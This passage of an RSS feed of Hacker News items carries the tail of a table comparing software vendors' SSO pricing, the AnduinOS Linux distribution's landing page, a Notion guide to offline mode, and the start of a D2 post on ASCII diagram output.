<td>100%</td>
<td>


<a href="https://www.workable.com/pricing">🔗</a>

</td>
<td>2024-07-03</td>
</tr>

<tr>
<td><a href="https://zeplin.io/">Zeplin</a></td>
<td>$10.75 per u/m</td>
<td>$21.50 per u/m<sup id="fnref:zeplin" role="doc-noteref"><a href="#fn:zeplin" rel="footnote">24</a></sup></td>
<td>100%</td>
<td>


<a href="https://sso.tax/Quote">🔗</a>

</td>
<td>2021-01-06</td>
</tr>

<tr>
<td><a href="https://zoom.us/">Zoom</a></td>
<td>$15.99 per u/m</td>
<td>$19.99 per u/m</td>
<td>25%</td>
<td>


<a href="https://zoom.us/pricing">🔗</a>

</td>
<td>2023-10-14</td>
</tr>

</tbody>
</table>

<h2 id="the-other-list">The Other List</h2>
<p>Some vendors simply do not list their pricing for SSO because the pricing is negotiated with an account manager. These vendors get their own table as we assume they apply a significant premium for SSO.</p>

<table>
<thead>
<tr><th>Vendor</th><th>Base Pricing</th><th>SSO Pricing</th><th>% Increase</th><th>Source</th><th>Date Updated</th></tr>
</thead>
<tbody>

<tr>
<td><a href="https://anydesk.com/">AnyDesk</a></td>
<td>$29.90 per month</td>
<td>Call Us! ($79.90/month+)</td>
<td>167%+</td>
<td>


<a href="https://anydesk.com/en/pricing">🔗</a>

</td>
<td>2024-02-06</td>
</tr>

<tr>
<td><a href="https://www.atera.com/">Atera</a></td>
<td>$149 per user/mo</td>
<td>Call Us!</td>
<td>???</td>
<td>


<a href="https://www.atera.com/it-department-pricing/">🔗</a>

</td>
<td>2024-08-29</td>
</tr>

<tr>
<td><a href="https://www.browserstack.com/">BrowserStack</a></td>
<td>$39 per u/m</td>
<td>Call Us!</td>
<td>???</td>
<td>


<a href="https://www.browserstack.com/pricing">🔗</a>

</td>
<td>2024-07-22</td>
</tr>

<tr>
<td><a href="https://www.bytebase.com/">Bytebase</a></td>
<td>$995 per year</td>
<td>Call Us!</td>
<td>???</td>
<td>


<a href="https://www.bytebase.com/pricing/">🔗</a>

</td>
<td>2024-02-12</td>
</tr>

<tr>
<td><a href="https://codeium.com/">Codeium</a></td>
<td>$15 per u/m</td>
<td>Call us</td>
<td>???</td>
<td>


<a href="https://codeium.com/pricing">🔗</a>

</td>
<td>2024-04-23</td>
</tr>

<tr>
<td><a href="https://dagster.io/">Dagster</a></td>
<td>$100 per month</td>
<td>Call Us!</td>
<td>???</td>
<td>


<a href="https://dagster.io/pricing">🔗</a>

</td>
<td>2024-12-04</td>
</tr>

<tr>
<td><a href="https://gathercontent.com/">GatherContent</a></td>
<td>$299</td>
<td>Call Us!</td>
<td>???</td>
<td>


<a href="https://gathercontent.com/pricing">🔗</a>

</td>
<td>2023-10-14</td>
</tr>

<tr>
<td><a href="https://www.getresponse.com/">GetResponse</a></td>
<td>$48 per month</td>
<td>Call Us! ($98/month+)</td>
<td>104%+</td>
<td>


<a href="https://www.getresponse.com/pricing#max">🔗</a>

</td>
<td>2023-10-15</td>
</tr>

<tr>
<td><a href="https://hex.tech/">Hex</a></td>
<td>$36 per u/m</td>
<td>Call Us!</td>
<td>???</td>
<td>


<a href="https://hex.tech/pricing/">🔗</a>

</td>
<td>2023-08-09</td>
</tr>

<tr>
<td><a href="https://www.hootsuite.com/">HootSuite</a></td>
<td>$249/mo</td>
<td>Call Us! (over $249/mo)<sup id="fnref:hootsuite" role="doc-noteref"><a href="#fn:hootsuite" rel="footnote">25</a></sup></td>
<td></td>
<td>


<a href="https://www.hootsuite.com/plans">🔗</a>

</td>
<td>2024-02-09</td>
</tr>

<tr>
<td><a href="https://jam.dev/">Jam</a></td>
<td>$8 per u/m</td>
<td>Call Us!</td>
<td>???</td>
<td>


<a href="https://jam.dev/pricing">🔗</a>

</td>
<td>2024-05-11</td>
</tr>

<tr>
<td><a href="">Kubecost</a></td>
<td>$449/mo</td>
<td>Call Us!</td>
<td>???</td>
<td>


<a href="https://www.kubecost.com/pricing">🔗</a>

</td>
<td>2022-06-15</td>
</tr>

<tr>
<td><a href="https://linearb.io/">LinearB</a></td>
<td>$49 per month<sup id="fnref:linearb" role="doc-noteref"><a href="#fn:linearb" rel="footnote">26</a></sup></td>
<td>Call Us!</td>
<td>???</td>
<td>


<a href="https://linearb.io/pricing">🔗</a>

</td>
<td>2024-10-16</td>
</tr>

<tr>
<td><a href="https://multi.app/">Multi</a></td>
<td>$30 per u/m</td>
<td>Call Us!</td>
<td>???</td>
<td>


<a href="https://multi.app/pricing">🔗</a>

</td>
<td>2024-02-27</td>
</tr>

<tr>
<td><a href="https://nationbuilder.com/">NationBuilder</a></td>
<td>$29 per month</td>
<td>Call Us! (over $199/month)</td>
<td>586%++<sup id="fnref:nationbuilder" role="doc-noteref"><a href="#fn:nationbuilder" rel="footnote">27</a></sup></td>
<td>


<a href="https://nationbuilder.com/pricing">🔗</a>

</td>
<td>2019-02-09</td>
</tr>

<tr>
<td><a href="https://onesignal.com/">OneSignal</a></td>
<td>$9 per month</td>
<td>Call Us! ($8000+ minimum annual commitment)</td>
<td>7307%</td>
<td>


<a href="https://onesignal.com/pricing">🔗</a>

Quote</td>
<td>2024-08-13</td>
</tr>

<tr>
<td><a href="https://www.pluralsight.com/">Pluralsight</a></td>
<td>$579 per u/y</td>
<td>Call Us!</td>
<td>???</td>
<td>


<a href="https://www.pluralsight.com/pricing/skills">🔗</a>

</td>
<td>2024-07-22</td>
</tr>

<tr>
<td><a href="https://prismic.io/">Prismic</a></td>
<td>$180 per repository/mo<sup id="fnref:prismic" role="doc-noteref"><a href="#fn:prismic" rel="footnote">28</a></sup></td>
<td>Call us</td>
<td>???</td>
<td>


<a href="https://prismic.io/pricing">🔗</a>

</td>
<td>2024-07-26</td>
</tr>

<tr>
<td><a href="https://www.process.st/">Process.st</a></td>
<td>$1500 per month</td>
<td>Call Us!</td>
<td>???</td>
<td>


<a href="https://www.process.st/pricing/">🔗</a>

</td>
<td>2024-06-10</td>
</tr>

<tr>
<td><a href="https://projectdiscovery.io/">Project Discovery</a></td>
<td>$100 per month</td>
<td>Call Us!</td>
<td>???</td>
<td>


<a href="https://projectdiscovery.io/pricing">🔗</a>

</td>
<td>2024-06-28</td>
</tr>

<tr>
<td><a href="https://resend.com/">Resend</a></td>
<td>$20 per u/m</td>
<td>Call Us!</td>
<td>???</td>
<td>


<a href="https://resend.com/pricing">🔗</a>

</td>
<td>2023-11-10</td>
</tr>

<tr>
<td><a href="https://retool.com/">Retool</a></td>
<td>$10 per u/m</td>
<td>Call Us!</td>
<td>400%+</td>
<td>


<a href="https://retool.com/pricing">🔗</a>

</td>
<td>2024-04-05</td>
</tr>

<tr>
<td><a href="https://saucelabs.com/">Sauce Labs</a></td>
<td>$49 per month for 1 test</td>
<td>Call Us!</td>
<td>???</td>
<td>


<a href="https://saucelabs.com/pricing">🔗</a>

</td>
<td>2024-07-22</td>
</tr>

<tr>
<td><a href="https://screencloud.com/">ScreenCloud</a></td>
<td>$24 per screen/m</td>
<td>Call Us!</td>
<td>???</td>
<td>


<a href="https://screencloud.com/pricing">🔗</a>

</td>
<td>2024-03-15</td>
</tr>

<tr>
<td><a href="https://www.sender.net/">Sender</a></td>
<td>$8.33 per month</td>
<td>Call Us! ($29+)</td>
<td>250%+</td>
<td>


<a href="https://www.sender.net/pricing/">🔗</a>

</td>
<td>2023-10-15</td>
</tr>

<tr>
<td><a href="https://smartsheet.com/">SmartSheet</a></td>
<td>$25 per u/m</td>
<td>Call Us!</td>
<td>???</td>
<td>


<a href="https://www.smartsheet.com/pricing">🔗</a>

</td>
<td>2018-10-22</td>
</tr>

<tr>
<td><a href="https://www.streamyard.com/">StreamYard</a></td>
<td>$99/mo</td>
<td>Call Us! (over $299/mo)</td>
<td>67%+<sup id="fnref:streamyard" role="doc-noteref"><a href="#fn:streamyard" rel="footnote">29</a></sup></td>
<td>


<a href="https://streamyard.com/plan?planType=businesses">🔗</a>

</td>
<td>2024-01-14</td>
</tr>

<tr>
<td><a href="https://www.surveymonkey.com/">SurveyMonkey</a></td>
<td>$25 per u/m</td>
<td>Call Us! (over $75 per u/m)</td>
<td>200%++</td>
<td>


<a href="https://www.surveymonkey.com/pricing/details/">🔗</a>

</td>
<td>2021-09-06</td>
</tr>

<tr>
<td><a href="https://www.teamviewer.com/">TeamViewer</a></td>
<td>$112.9 per month</td>
<td>Call Us! ($229.9/month+)</td>
<td>103%+</td>
<td>


<a href="https://service.teamviewer.com/en-us/overview/a">🔗</a>

</td>
<td>2024-02-06</td>
</tr>

<tr>
<td><a href="https://www.teamwork.com/">Teamwork.com</a></td>
<td>$13.99 per u/m</td>
<td>Call us</td>
<td>???</td>
<td>


<a href="https://support.teamwork.com/projects/security/teamwork-advanced-security-add-on">🔗</a>

</td>
<td>2024-07-26</td>
</tr>

<tr>
<td><a href="https://typeform.com/">Typeform</a></td>
<td>$50 per u/m</td>
<td>Call Us!</td>
<td>???</td>
<td>


<a href="https://www.typeform.com/pricing/">🔗</a>

</td>
<td>2024-06-20</td>
</tr>

<tr>
<td><a href="https://vercel.com/">Vercel</a></td>
<td>$20 per u/m</td>
<td>Call Us!<sup id="fnref:vercel" role="doc-noteref"><a href="#fn:vercel" rel="footnote">30</a></sup></td>
<td>1150%</td>
<td>


<a href="https://vercel.com/pricing">🔗</a>

</td>
<td>2023-10-17</td>
</tr>

<tr>
<td><a href="https://webflow.com/">Webflow</a></td>
<td>$12 per u/m</td>
<td>Call Us!</td>
<td>???</td>
<td>


<a href="https://webflow.com/pricing">🔗</a>

</td>
<td>2022-07-07</td>
</tr>

<tr>
<td><a href="https://wandb.ai/">Weights and Biases</a></td>
<td>$50 per u/m</td>
<td>Call Us!</td>
<td>???</td>
<td>


<a href="https://wandb.ai/site/pricing">🔗</a>

</td>
<td>2023-07-12</td>
</tr>

<tr>
<td><a href="https://www.zight.com/">Zight</a></td>
<td>$8 per u/m</td>
<td>Call Us!</td>
<td>???</td>
<td>


<a href="https://zight.com/plans/">🔗</a>

</td>
<td>2023-10-17</td>
</tr>

<tr>
<td><a href="https://www.getdbt.com/">dbt Cloud</a></td>
<td>$100 per u/m</td>
<td>Call Us!</td>
<td>???</td>
<td>


<a href="https://www.getdbt.com/pricing">🔗</a>

</td>
<td>2024-12-18</td>
</tr>

<tr>
<td><a href="https://n8n.io/">n8n</a></td>
<td>$24 per month</td>
<td>Call Us!</td>
<td>???</td>
<td>


<a href="https://n8n.io/pricing/">🔗</a>

</td>
<td>2024-11-01</td>
</tr>

</tbody>
</table>

<h2 id="faqs">FAQs</h2>

<details>
  <summary>
    <p>This doesn’t scale linearly for number of seats!</p>
  </summary>
  <p>Correct. Since we don’t know who’s reading the page, it’s easiest to just assume a team with no volume discount.</p>
</details>

<details>
  <summary>
    <p>How is base pricing determined?</p>
  </summary>
  <p>We disregard free tier pricing, as we can assume these aren’t intended for long term business customer use. We also disregard “single person” pricing, under the assumption that we’re looking on behalf of a team of 5, 10, or more people.</p>
</details>

<details>
  <summary>
    <p>What does “Quote” mean in the Source column?</p>
  </summary>
  <p>If a vendor doesn’t list pricing but a user has submitted pricing based on a quote, it can be included here. If a vendor feels that their actual pricing is inaccurately reflected by this quote, feel free to let me know and I’ll update the page.</p>
</details>

<details>
  <summary>
    <p>I’m a vendor and this data is wrong!</p>
  </summary>
  <p>Please feel free to submit a PR to this page, or reach out at sso @ myGitHubUsername dotcom. I only want this data to be accurate.</p>
</details>

<details>
  <summary>
    <p>I’m a vendor and this doesn’t reflect the value-add of our Enterprise tier!</p>
  </summary>
  <p>That’s the point. Decouple your security features from your value-added services. They should be priced separately.</p>
</details>

<details>
  <summary>
    <p>But it costs money to provide SAML support, so we can’t offer it for free!</p>
  </summary>
  <p>While I’d like people to really consider it a <em>bare minimum</em> feature for business SaaS, I’m OK with it costing a little extra to cover maintenance costs. If your SSO support is a 10% price hike, you’re not on this list. But these percentage increases are not maintenance costs, they’re revenue generation because you know your customers have no good options.</p>
</details>






      
    </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[AnduinOS (136 pts)]]></title>
            <link>https://www.anduinos.com/</link>
            <guid>44954823</guid>
            <pubDate>Tue, 19 Aug 2025 18:42:25 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.anduinos.com/">https://www.anduinos.com/</a>, See on <a href="https://news.ycombinator.com/item?id=44954823">Hacker News</a></p>
<div id="readability-page-1" class="page">




<!-- Ad Banner -->



<nav>
    
</nav>


<div>
            <div>
                <p><span>Open Source</span>
                <span>Free</span>
                <span>GPL-v3 License</span></p><h2 id="main-slogan">
                    <span>AnduinOS</span> is Ubuntu's package base + <span>Flatpak</span> app experience
                </h2>
                <p>AnduinOS is a custom Ubuntu-based Linux distribution that offers a familiar and easy-to-use experience for anyone moving to Linux.</p>
                <p><span>v1.3.4</span>
                </p>
                
                
            </div>
            <div>
                <p><img src="https://www.anduinos.com/sc.webp" alt="AnduinOS Main screenshot">
                </p>
            </div>
        </div>

<div>
        <div>
            <p><span>Reasons</span></p><h2>Why choose AnduinOS?</h2>
            <p>Smaller image, friendly interface, unbeatable performance, safe and secure.
            </p>
        </div>
        <div>
            <div>
                        <h4>Ready to use</h4>
                        <p>The ISO is just 2.0GB in size. Similar to Ubuntu, it is simple to install and can meet your daily needs without additional configuration or complicated operations.</p>
                    </div>
            <div>
                        <h4>Friendly interface</h4>
                        <p>The GNOME-based desktop environment have beautiful interfaces and human-computer interactions that fit user habits, allowing you to quickly get started with AnduinOS without too much learning cost.</p>
                    </div>
            <div>
                        <h4>Root and privacy</h4>
                        <p>Privacy is no longer optional. It's essential. AnduinOS is designed to gather nothing from you. We don't track you. We don't profile you. We don't target you. You remain anonymous to the system.</p>
                    </div>
            <div>
                        <h4>Ecological perfection</h4>
                        <p>AnduinOS is based on Ubuntu's package base. It's compatible with most of the apt packages from Ubuntu. It's a perfect combination of experience and ecology.</p>
                    </div>
            <div>
                        <h4>Open Source</h4>
                        <p>AnduinOS is an open-source project. Following the GPL-v3 license, you can view the source code, modify it, and redistribute it. It's free and will always be free.</p>
                    </div>
            <div>
                        <h4>Containerized</h4>
                        <p>Graphical applications are installed via Flatpak, and keep themselves separate from the base system (Since 1.3). They also allow for fine-grained control over their permissions.</p>
                    </div>
        </div>
    </div>

<div id="download-links">
                <div>
                    <p><span>Versions</span></p><h2>Choose your AnduinOS version</h2>
                    <p>AnduinOS is available in <a href="https://docs.anduinos.com/VERSIONS.html">two version branches</a>: LTS and Standard.
                        The LTS version is recommended for users need a stable long-term support, while the Standard version is recommended for users with newer devices and want to explore the latest features.
                    </p>
                </div>
                <div>
                        <div>
                                    

                                    <h6>Includes:</h6>
                                    <ul>
                                        <li>Support till Apr 2029</li>
                                        <li>Gnome 46</li>
                                        <li>Ubuntu 24.04 packages</li>
                                        <li>Linux kernel 6.11</li>
                                        <li>Released on 2025.01.06</li>
                                        <li>
                                            Latest version 1.1.7
                                        </li>
                                            <li>Recommended for users need a stable long-term version and on older hardware.</li>
                                    </ul>

                                    
                                </div>
                        <div>
                                    <div>
                                        <h5>Plucky Puffin</h5>
                                        <p><span>
                                            1.3
                                        </span><br>
                                        <span>Standard</span>
                                    </p></div>

                                    <h6>Includes:</h6>
                                    <ul>
                                        <li>Support till Jan 2026</li>
                                        <li>Gnome 48</li>
                                        <li>Ubuntu 25.04 packages</li>
                                        <li>Linux kernel 6.14</li>
                                        <li>Released on 2025.05.01</li>
                                        <li>
                                            Latest version 1.3.4
                                        </li>
                                            <li>Using flatpak for graphical applications.</li>
                                            <li>
                                                <span>
                                                    Recommended
                                                </span>
                                            </li>
                                    </ul>

                                    
                                </div>
                </div>
            </div>

<div>
                <div>
                            <p><span>Usage</span></p><h2>With AnduinOS, you can do more</h2>
                            <p>
                                Everything you do on Ubuntu, you can do it on AnduinOS. You can use it as a daily operating system, a development environment, a server, or a learning tool. It's up to you.
                            </p>
                        </div>

                <div>
                    <div>
                        <p><img gallery="" src="https://www.anduinos.com/scs/watch_comp.webp" loading="lazy" alt="Watching Youtube Videos on AnduinOS"></p><h4>Browsing</h4>
                    </div>
                    <div>
                        <p><img gallery="" src="https://www.anduinos.com/scs/steam_comp.webp" loading="lazy" alt="Steam Playing Games on AnduinOS"></p><h4>Gaming <sup><small>With Steam</small></sup></h4>
                    </div>
                    <div>
                        <p><img gallery="" src="https://www.anduinos.com/scs/build_comp.webp" loading="lazy" alt="Writing Code on AnduinOS"></p><h4>Build</h4>
                    </div>
                    <div>
                        <p><img gallery="" src="https://www.anduinos.com/scs/office_comp.webp" loading="lazy" alt="Working on mail and chat on AnduinOS"></p><h4>Work</h4>
                    </div>
                    <div>
                        <p><img gallery="" src="https://www.anduinos.com/scs/serve_comp.webp" loading="lazy" alt="Hosting a server on AnduinOS"></p><h4>Serve</h4>
                    </div>
                    <div>
                        <p><img gallery="" src="https://www.anduinos.com/scs/blender_comp.webp" loading="lazy" alt="Editing blender 3D model on AnduinOS"></p><h4>Editing</h4>
                    </div>
                </div>
            </div>

<p><span onclick="igl_hide()">×</span>
    <img id="iglmodal-img" alt="Image preview" src="#">
</p>

<div>
            <p><span>Reviews</span></p><h2>What users are saying</h2>
            <p>Here's what some of our 2000+ users have to say about working with AnduinOS.
            </p>
        </div>

<div>
            <div>
                        <h4>
                            <a href="https://www.windowscentral.com/software-apps/a-microsoft-engineer-made-a-linux-distro-thats-like-a-comfort-blanket-to-ex-windows-users" target="_blank">Windows Central</a>
                        </h4>
                        <p>...it's pretty spectacular. It's also quite possibly one of the friendliest Linux distros I've tried when it comes to folks who may well be moving over from Windows. Built by one person, it's pretty astonishing how good it is.</p>
                    </div>
            <div>
                        <h4>
                            <a href="https://www.zdnet.com/article/this-windows-11-like-linux-distribution-is-aimed-squarely-at-developers/" target="_blank">ZDNet</a>
                        </h4>
                        <p>In fact, this is one of those "set-it-and-forget-it" distributions that makes using Linux a delight. It's intuitive, simple to use, and well-designed.</p>
                    </div>
            <div>
                        <h4>
                            <a href="https://betanews.com/2025/05/01/say-no-thanks-microsoft-windows-11-and-yes-please-to-anduinos-1-3/" target="_blank">BetaNews</a>
                        </h4>
                        <p>The OS continues to focus on ease of use, especially for those users moving over from Windows.</p>
                    </div>
            <div>
                        <h4>
                            <a href="https://www.neowin.net/news/the-sole-maintainer-of-linux-distribution-anduinos-turns-out-to-be-a-microsoft-employee/" target="_blank">Neowin</a>
                        </h4>
                        <p>Linux stands as a good option to keep computers running, and if you want something that looks similar to Windows, then AnduinOS is worth checking out.</p>
                    </div>
        </div>

<div>
        <div>
            <p><span>FAQ</span></p><h2>Frequently asked questions</h2>
            <p>Here are some of the answers you might be looking for.</p>
        </div>

        <div id="accordionFaq">
                    <div id="collapseZero" aria-labelledby="faqOne" data-bs-parent="#accordionFaq">
                            <p>
                                Yes, AnduinOS is free to use. It is an open-source project that follows the GPL-v3 license. You can view the source code, modify it, and redistribute it. It's free and will always be free.
                            </p>
                        </div>
                    <div id="collapseOne" aria-labelledby="faqOne" data-bs-parent="#accordionFaq"><p>
                                AnduinOS is based on Ubuntu's package base. Any software that runs on Ubuntu that can run on AnduinOS. You can run a variety of applications, including but not limited to: Linux apps, web apps, and even Windows apps using Wine.
                                </p><p>
                                AnduinOS uses Flatpak to manage graphical applications. Flatpak is a software utility for software deployment, application virtualization, and package management. It allows you to run applications in a sandboxed environment, which can help improve security and stability.
                            </p></div>
                    <div id="collapseTwo" aria-labelledby="faqTwo" data-bs-parent="#accordionFaq">
                            <p>
                                On Ask Ubuntu, you can search for and ask about very common issues. Solutions for almost all AnduinOS issues are identical to those for Ubuntu. You can rely entirely on Ubuntu's documentation and expertise to resolve problems with AnduinOS.
                            </p>
                        </div>
                    <div id="collapseThree" aria-labelledby="faqThree" data-bs-parent="#accordionFaq">
                            <p>
                                You have access to AnduinOS online support services via GitHub Discussions. Please contact us at <a href="https://github.com/Anduin2017/AnduinOS/discussions">here</a>
                                for any questions.
                            </p>
                        </div>
                    <div id="collapseWho" aria-labelledby="faqOne" data-bs-parent="#accordionFaq"><p>
                                AnduinOS is a non-profit project built in spare time, sustained solely through donations, and is not backed by any corporation or national government.
                                <a href="https://news.anduinos.com/post/2025/5/6/story-behind-anduinos-a-letter-from-anduin" target="_blank">Read more</a>.
                                </p><p>
                                AnduinOS is funded by user donations. We are grateful for your support. And you can <a href="https://www.paypal.com/paypalme/anduinxue2017" target="_blank">donate</a>
                                to us via PayPal.
                            </p></div>
                    
                </div>
    </div>








    










</div>]]></description>
        </item>
        <item>
            <title><![CDATA[Notion releases offline mode (229 pts)]]></title>
            <link>https://www.notion.com/help/guides/working-offline-in-notion-everything-you-need-to-know</link>
            <guid>44954665</guid>
            <pubDate>Tue, 19 Aug 2025 18:27:34 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.notion.com/help/guides/working-offline-in-notion-everything-you-need-to-know">https://www.notion.com/help/guides/working-offline-in-notion-everything-you-need-to-know</a>, See on <a href="https://news.ycombinator.com/item?id=44954665">Hacker News</a></p>
<div id="readability-page-1" class="page"><section><div><p><span>In this guide</span></p><ul><li><span><span>How to use Notion offline</span></span></li><li><span><span>Get ready to go offline with Notion</span></span></li><li><span><span>Before going offline</span></span></li><li><span><span>Working offline effectively</span></span></li></ul></div><hr><article><p>Ever tried to dive into work, only to realize you’re offline? Maybe you’re on a flight, off the grid, or stuck in a dead zone right when inspiration hits.</p><p>With Notion’s offline mode, you can keep your workflow uninterrupted, your content protected, and your work accessible from anywhere, no signal required. Because even if the internet drops, your momentum doesn’t have to.</p><p>In this guide, we’ll cover:</p><div><ul><li><p>How to prepare Notion for offline work</p></li><li><p>Tips to follow before going offline</p></li><li><p>Key differences to keep in mind while offline</p></li></ul></div><p>All Notion users can view, edit, and create pages offline on the desktop or mobile app. Anyone can download individual pages they need to use offline. On the Plus, Business, and Enterprise plans, Notion also automatically downloads your recent and favorited pages, so they're ready when you need them.</p><p>To get started, open any page, tap the <code>•••</code> menu in the top‑right corner, and turn on <code>Available offline</code>. You'll see a progress bar while your page downloads.</p><div role="button" aria-label="Open lightbox"><figure><figcaption><p>Open any page, tap the ••• menu in the top-right corner, and turn on Available offline to get started.</p></figcaption></figure></div> <p>Any changes you make offline will save locally and sync automatically the next time your device connects to the internet. To see which pages are saved offline open the <code>Offline tab</code> in your <code>Settings</code>. From there, you see pages downloaded by you or Notion. You can also remove pages from offline access right from this tab.</p><div><p><img alt="" loading="lazy" width="60" height="60" decoding="async" data-nimg="1" srcset="https://www.notion.com/_next/image?url=%2Ffront-static%2Fshared%2Fcallouts%2Ftip-illustration-v4.png&amp;w=96&amp;q=75 1x, https://www.notion.com/_next/image?url=%2Ffront-static%2Fshared%2Fcallouts%2Ftip-illustration-v4.png&amp;w=128&amp;q=75 2x" src="https://www.notion.com/_next/image?url=%2Ffront-static%2Fshared%2Fcallouts%2Ftip-illustration-v4.png&amp;w=128&amp;q=75"></p><div><p>Remember to mark your pages as offline across your devices</p></div></div><p>Even without internet, you can keep your work moving. A little preparation (and a few best practices) will keep Notion running smoothly wherever you are. Here’s how: </p><div><p><h3 id="before-going-offline"><strong>Before going offline</strong></h3></p></div><div><ul><li><p><strong>Mark pages for offline use on each device—</strong> Enable <code>Available offline </code>for pages you plan to work on, since offline access is device-specific.</p></li><li><p><strong>Confirm downloads— </strong>You<strong> </strong>can check the <code>Offline </code>tab in <code>Settings </code>to see which pages you’ve already downloaded.</p><div role="button" aria-label="Open lightbox"><figure><figcaption><p>Go to Settings → Offline to view, search, and organize all your offline pages in one place.          Ask ChatGPT</p></figcaption></figure></div> </li><li><p><strong>Download specific rows from your database—</strong> When you download a database, the first 50 rows download </p><p>automatically. To ensure additional rows are available, individually download them for offline use.</p><div><p><img alt="" loading="lazy" width="60" height="60" decoding="async" data-nimg="1" srcset="https://www.notion.com/_next/image?url=%2Ffront-static%2Fshared%2Fcallouts%2Ftip-illustration-v4.png&amp;w=96&amp;q=75 1x, https://www.notion.com/_next/image?url=%2Ffront-static%2Fshared%2Fcallouts%2Ftip-illustration-v4.png&amp;w=128&amp;q=75 2x" src="https://www.notion.com/_next/image?url=%2Ffront-static%2Fshared%2Fcallouts%2Ftip-illustration-v4.png&amp;w=128&amp;q=75"></p></div></li><li><p><strong>Mark sub-pages individually—</strong> If you have a top-level (parent) page with many sub-pages, be sure to mark each one you need for offline access.</p></li></ul></div><div><p><img alt="" loading="lazy" width="60" height="60" decoding="async" data-nimg="1" srcset="https://www.notion.com/_next/image?url=%2Ffront-static%2Fshared%2Fcallouts%2Ftip-illustration-v4.png&amp;w=96&amp;q=75 1x, https://www.notion.com/_next/image?url=%2Ffront-static%2Fshared%2Fcallouts%2Ftip-illustration-v4.png&amp;w=128&amp;q=75 2x" src="https://www.notion.com/_next/image?url=%2Ffront-static%2Fshared%2Fcallouts%2Ftip-illustration-v4.png&amp;w=128&amp;q=75"></p><div><p>I don’t want to have to download my pages manually. Is there any other way?</p></div></div><div><ul><li><p><strong>Plan ahead for sharing or updates—</strong> You won’t be able to share pages or change permissions while offline, so make any updates before you disconnect or once you’re back online.</p></li></ul></div><div><p><h3 id="working-offline-effectively"><strong>Working offline effectively</strong></h3></p></div><p>Think of offline time as your secret weapon for focus—no pings, no tabs, just you and your work. Here’s how you can make it count:</p><div><ul><li><p><strong>Dive into deep work— </strong>Use offline time for writing, planning, or reviewing (the kind of tasks that thrive without distraction!)</p></li><li><p><strong>Collaborate seamlessly when offline— </strong>Notion updates your changes alongside others’ when you reconnect. Text merges happen automatically, with non-text changes (like images) sometimes needing a quick review.</p></li><li><p><strong>Work within the limits— </strong>Most blocks can be viewed and edited offline, but elements that require a live connection, such as embeds, forms, or buttons, will be unavailable.</p></li><li><p><strong>Sync up regularly— </strong>Reconnect when you can to upload changes and refresh your content.</p></li><li><p><strong>Search shows what’s ready to use—</strong> Offline pages appear first, while unavailable ones are greyed out, helping you quickly focus on what you can work on right now.</p></li></ul></div><p>Your updates save seamlessly once you’re back online, even if others edited the page at the same time. The sync status indicator confirms everything is up to date.</p><div role="button" aria-label="Open lightbox"><figure><figcaption><p>When back online, check the sync indicator to confirm changes are saved—most text edits merge automatically.</p></figcaption></figure></div> <p>Offline doesn’t have to mean <i>on hold</i>. By marking your key pages, knowing what works without a connection, and following a few best practices, you’ll be ready to work seamlessly (online or off!) And when you reconnect, everything syncs seamlessly so you can pick up right where you left off.</p></article></section></div>]]></description>
        </item>
        <item>
            <title><![CDATA[D2 (text to diagram tool) now supports ASCII renders (393 pts)]]></title>
            <link>https://d2lang.com/blog/ascii/</link>
            <guid>44954524</guid>
            <pubDate>Tue, 19 Aug 2025 18:14:41 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://d2lang.com/blog/ascii/">https://d2lang.com/blog/ascii/</a>, See on <a href="https://news.ycombinator.com/item?id=44954524">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="__blog-post-container"><p>In the latest release of D2 (0.7.1), we introduce ASCII outputs.</p>
<p>Any output file with extension <code>txt</code> will use the ASCII renderer to write to it.</p>
<!-- -->
<p>Here is an example of their rendering from the <a href="https://github.com/terrastruct/d2-vim" target="_blank" rel="noopener noreferrer">D2 Vim extension</a>. The user opens a <code>.d2</code> file and opens a preview window, which updates upon every save.</p>
<p><img decoding="async" loading="lazy" alt="D2 Vim preview" src="https://d2lang.com/assets/images/preview-d04cd1ad32fec06203b93a3ac64d903f.gif" width="1159" height="1470"></p>
<h2 id="code-documentation">Code documentation<a href="#code-documentation" aria-label="Direct link to Code documentation" title="Direct link to Code documentation">​</a></h2>
<p>Perhaps the most useful place for ASCII diagrams is in the source code comments. Small
simple diagrams next to functions or classes can serve to be much clearer than describing
a flow.</p>
<p>Here again the Vim extension demonstrates a functionality to write some d2 code and
replace the selection with the ASCII render.</p>
<p><img decoding="async" loading="lazy" alt="D2 Vim replace" src="https://d2lang.com/assets/images/replace-7658a2addaa42da73547218f1cffe1d5.gif" width="1159" height="1470"></p>
<h2 id="unicode-and-standard-ascii">Unicode and standard ASCII<a href="#unicode-and-standard-ascii" aria-label="Direct link to Unicode and standard ASCII" title="Direct link to Unicode and standard ASCII">​</a></h2>
<p>The default character set of ASCII renders is unicode, which has nicer box-drawing
characters. If you'd like true ASCII for maximum portability, you can specify this with
the flag <code>--ascii-mode=standard</code>.</p>
<h2 id="limitations">Limitations<a href="#limitations" aria-label="Direct link to Limitations" title="Direct link to Limitations">​</a></h2>
<div><p><span><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>Alpha</p><p>Note that the ASCII renderer should be considered in alpha stage. There will be many
corner cases, areas of improvements, and outright bugs. If you enjoy using it, we'd
appreciate you taking the time to file any issues you run into:
<a href="https://github.com/terrastruct/d2/issues" target="_blank" rel="noopener noreferrer">https://github.com/terrastruct/d2/issues</a>.</p></div>
<p>The ASCII renderer is a downscale of the layout determined by the ELK layout engine with
some post-processing to further compact it.</p>
<ul>
<li>No styles are supported<!-- -->
<ul>
<li>Some will never be, e.g. <code>animated</code> and <code>font</code> don't make sense in ASCII.</li>
<li>Some may in the future with limited scope, e.g. colors when rendered to terminal.<!-- -->
<ul>
<li>By extension, themes are moot</li>
</ul>
</li>
<li>Some should be considered TODOs, e.g. <code>double-border</code> and <code>multiple</code></li>
</ul>
</li>
<li>Uneven spacing<!-- -->
<ul>
<li>Sometimes the downscaling results in a box with uneven spacing, e.g. a rectangle with
width 5 and the label is 2 chars. Due to discrete coordinate space in ASCII renders, some
outputs may look less even than their SVG counterparts.</li>
